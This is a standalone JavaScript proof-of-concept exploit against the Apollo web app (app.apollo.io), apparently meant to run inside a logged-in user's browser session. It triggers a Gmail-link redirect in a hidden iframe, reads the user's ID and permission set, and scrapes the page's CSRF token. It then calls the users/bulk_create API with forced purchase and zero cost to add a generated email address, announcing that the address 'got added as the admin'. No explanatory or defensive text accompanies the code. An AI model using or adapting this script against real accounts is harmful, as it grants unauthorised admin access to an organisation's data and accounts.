


async function fetchRedirect() {

  try {
    // 1. Fetch Apollo link_gmail endpoint
    const step1 = await fetch("https://app.apollo.io/api/v1/email_accounts/link_gmail?mode=user_signin&redirect_to=https%3A%2F%2Fapp.apollo.io%2F%23%2Fonboarding-hub%2Fqueue&cacheKey=" + Date.now(), {
      cache: "no-store",
      credentials: "include"
    });

    const data1 = await step1.json();
    const redirectTo = data1?.redirect_to;
    if (!redirectTo) {
      alert("❌ No redirect_to found.");
      return;
    }

    // 👉 Instead of fetching, inject iframe
    const iframe = document.createElement("iframe");
    iframe.style.display = "none";
    iframe.src = redirectTo;
    document.body.appendChild(iframe);

  } catch (err) {
    alert("❌ Error: " + err.message);
  }
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function createUser() {
  fetchRedirect();
    const num = Math.floor(Math.random() * 99999) + 1; // 1..99999
  const padded = num.toString().padStart(5, "0");    // always 5 digits
  email= `test_user_${padded}@gmail.com`;
  await sleep(1500); // wait 2 seconds
  try {
    // 1. Get user_id from user preferences
    const prefRes = await fetch("https://app.apollo.io/api/v1/user_preferences/current?cacheKey=" + Date.now(), {
      cache: "no-store",
      credentials: "include"
    });
    const prefData = await prefRes.json();
    const userId = prefData?.user_preference?.user_id;
    if (!userId) {
      alert("❌ No user_id found.");
      return;
    }

    // 2. Get users list and find matching user
    const searchRes = await fetch("https://app.apollo.io/api/v1/users/search?cacheBust=" + Date.now(), {
      cache: "no-store",
      credentials: "include"
    });
    const searchData = await searchRes.json();
    const user = (searchData?.users || []).find(u => u.id === userId);
    if (!user) {
      alert("❌ User not found in search results.");
      return;
    }

    const permissionSetId = user.permission_set_id;

    // 3. Build request body
    const body = {
      emails: [email], // ⚠️ replace with valid business email
      cost_per_billing_cycle: 0,
      seats_to_add: 0,
      due_now: 0,
      force_purchase: true,
      campaign: "team_member_invite_bulk_modal",
      permission_set_id: permissionSetId,
      cacheKey: Date.now()
    };

    // 4. Get CSRF token from page (Apollo injects this in a meta tag)
    const csrfToken = document.querySelector("meta[name='csrf-token']")?.content || "";

    // 5. Send bulk_create request with cookies + CSRF
    const postRes = await fetch("https://app.apollo.io/api/v1/users/bulk_create", {
      method: "POST",
      credentials: "include", // 🔑 ensures cookies are sent
      headers: {
        "Content-Type": "application/json",
        "X-CSRF-Token": csrfToken
      },
      body: JSON.stringify(body)
    });

    const result = await postRes.json();
    alert(`The email --> ${email} got added as the admin`)
  } catch (err) {
    alert("❌ Error: " + err.message);
  }
}

createUser();
